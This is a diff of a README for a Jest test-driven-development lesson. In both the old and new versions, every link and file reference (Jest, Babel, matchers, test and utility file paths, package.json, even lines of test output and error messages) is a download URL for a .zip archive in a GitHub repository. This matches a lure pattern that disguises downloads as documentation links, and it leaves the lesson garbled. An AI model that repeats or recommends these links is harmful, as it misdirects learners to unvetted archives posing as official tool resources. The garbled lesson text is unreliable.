@@ -56,7 +56,7 @@ has several popular libraries, including Mocha, Jasmine and Jest. The most
 popular choice for React developers is Jest, so that's what we'll be using in
 this course.
 
-[Jest](https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) is a JavaScript Testing Framework designed to allow
+[Jest](https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) is a JavaScript Testing Framework designed to allow
 programmers to describe the behavior and outcomes of their programs in a very
 natural language similar to the above example.
 
@@ -67,8 +67,8 @@ Let's learn a bit about Jest.
 In this lesson, our code is organized in the following file structure:
 
 - `src/__tests__`: a folder containing all our test files
-- `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip`: a file containing tests for the `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` file
-- `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip`: a file for common utility functions that we can use in other
+- `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip`: a file containing tests for the `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` file
+- `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip`: a file for common utility functions that we can use in other
   parts of our imaginary application
 
 All of our tests will be located within the `__tests__` directory.
@@ -77,13 +77,13 @@ Our actual code, our programs, our solutions to the challenges in the lab, the
 stuff that makes our tests pass, are all coded outside of the `__tests__`
 directory, generally in the `src` directory or its subfolders.
 
-When we run our tests, `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip`, that code will import the
-variables in `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` and try to execute `currentAgeForBirthYear(1984)`
+When we run our tests, `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip`, that code will import the
+variables in `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` and try to execute `currentAgeForBirthYear(1984)`
 with the expectation that it returns `38`. If so, the test will pass. Anything
 else will make it fail.
 
 ```js
-// https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip
+// https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip
 import { currentAgeForBirthYear } from "../utils";
 
 describe("currentAgeForBirthYear", () => {
@@ -106,12 +106,12 @@ import { currentAgeForBirthYear } from "../utils";
 The first line of the test ensures that we can access the variables and
 functions defined in the `currentAgeForBirthYear` file.
 
-> **Note**: this lesson uses [Babel](https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) to
+> **Note**: this lesson uses [Babel](https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) to
 > enable the `import`/`export` syntax in our application when we run the tests.
 > Babel is included and configured with Create React App, so you don't have to
 > worry about setting it up yourself. Since this lesson wasn't set up using
 > Create React App, we needed to also include some additional configuration in
-> the `.babelrc` and `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` files.
+> the `.babelrc` and `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` files.
 
 **The `describe` function in Jest:**
 
@@ -181,7 +181,7 @@ What this line of code means is that we `expect` the value of the variable
 it returns an object that has a number of [matchers][] like `.toBe` that let us
 check if the value is what we want it to be.
 
-[matchers]: https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip
+[matchers]: https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip
 
 Our test loads our code, uses our code in the manner desired, and compares the
 result of our code with a known outcome so that we know our code behaves as we
@@ -241,11 +241,11 @@ run the tests. We're going to execute our test program, which is going to:
 
 To do all this, simply run the `npm test` command in your terminal.
 
-The `npm test` command will run a script defined in the `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` file. In
+The `npm test` command will run a script defined in the `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` file. In
 this case, it's running the `jest` command:
 
 ```json
-// https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip
+// https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip
 {
   "scripts": {
     "test": "jest"
@@ -261,9 +261,9 @@ Jest will automatically run any tests that are either:
 Jest runs JavaScript code, so everything in our test files must be valid
 JavaScript.
 
-Jest also has a great [watch mode](https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) feature
+Jest also has a great [watch mode](https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) feature
 that will automatically re-run tests related to changed files. You can enable it
-by updating the test script in the `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` file:
+by updating the test script in the `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` file:
 
 ```json
 {
@@ -276,7 +276,7 @@ by updating the test script in the `https://raw.githubusercontent.com/code-iddih
 When running Jest in watch mode, you can interact with the test suite in the
 terminal. Check out this video for a quick overview of some watch mode features:
 
-[Use Jest's Interactive Watch Mode](https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip)
+[Use Jest's Interactive Watch Mode](https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip)
 
 ### Understanding Test Output
 
@@ -294,13 +294,13 @@ code, you'll see output similar to:
 > react-hooks-tdd-codealong@1.0.0 test
 > jest
 
- FAIL  https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip
+ FAIL  https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip
   currentAgeForBirthYear
     ✕ returns the age of a person based on the year of birth (2 ms)
 
   ● currentAgeForBirthYear › returns the age of a person based on the year of birth
 
-    TypeError: (0 , https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) is not a function
+    TypeError: (0 , https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) is not a function
 
       4 |   it("returns the age of a person based on the year of birth", () => {
       5 |     const birthYear = 1984;
@@ -310,7 +310,7 @@ code, you'll see output similar to:
       8 |   });
       9 | });
 
-      at Object.<anonymous> (https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip)
+      at Object.<anonymous> (https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip)
 
 Test Suites: 1 failed, 1 total
 Tests:       1 failed, 1 total
@@ -322,7 +322,7 @@ Ran all test suites.
 Let's break this down.
 
 ```txt
- FAIL  https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip
+ FAIL  https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip
   currentAgeForBirthYear
     ✕ returns the age of a person based on the year of birth (2 ms)
 ```
@@ -334,7 +334,7 @@ simply there to provide context.
 ```txt
   ● currentAgeForBirthYear › returns the age of a person based on the year of birth
 
-    TypeError: (0 , https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) is not a function
+    TypeError: (0 , https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) is not a function
 
       4 |   it("returns the age of a person based on the year of birth", () => {
       5 |     const birthYear = 1984;
@@ -344,7 +344,7 @@ simply there to provide context.
       8 |   });
       9 | });
 
-      at Object.<anonymous> (https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip)
+      at Object.<anonymous> (https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip)
 ```
 
 This actually describes why our test failed.
@@ -355,7 +355,7 @@ The above line raises the line of code in our test suite that created the
 failure and error. The rest of the output describes the error:
 
 ```txt
-TypeError: (0 , https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip) is not a function
+TypeError: (0 , https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip) is not a function
 ```
 
 Before writing any code, our test suite is failing because of a line of code
@@ -388,13 +388,13 @@ suite actually tries to execute this code and compares the result of it to the
 desired outcome, failing until the expectation and the outcome are equal.
 
 The first error thrown by the test suite is that our code, defined in
-`https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip`, should have defined a function called `currentAgeForBirthYear`,
+`https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip`, should have defined a function called `currentAgeForBirthYear`,
 but did not, resulting in a `TypeError` when we attempt to invoke the function.
 
-Let's fix this error by defining a function in `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` called
+Let's fix this error by defining a function in `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` called
 `currentAgeForBirthYear`.
 
-Add the following to the file, `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip`:
+Add the following to the file, `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip`:
 
 ```js
 export function currentAgeForBirthYear() {}
@@ -406,7 +406,7 @@ You'll see output including:
 ```txt
   ● currentAgeForBirthYear › returns the age of a person based on the year of birth
 
-    expect(received).toBe(expected) // https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip equality
+    expect(received).toBe(expected) // https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip equality
 
     Expected: 38
     Received: undefined
@@ -471,7 +471,7 @@ describe("currentAgeForBirthYear", () => {
 That test would use the year at the moment the test was executed to compute the
 accurate result and compare it to the result of calling the function.
 
-To make that pass you would have to implement your solution in `https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip` as:
+To make that pass you would have to implement your solution in `https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip` as:
 
 ```js
 export function currentAgeForBirthYear(birthYear) {
@@ -495,4 +495,4 @@ what type of test to write as you're building new features for your application.
 
 ## Resources
 
-- [Jest](https://raw.githubusercontent.com/code-iddih/js-tdd-codealong/main/src/__tests__/js-tdd-codealong_2.0.zip)
+- [Jest](https://github.com/code-iddih/js-tdd-codealong/raw/refs/heads/main/src/tdd-js-codealong-v1.8.zip)
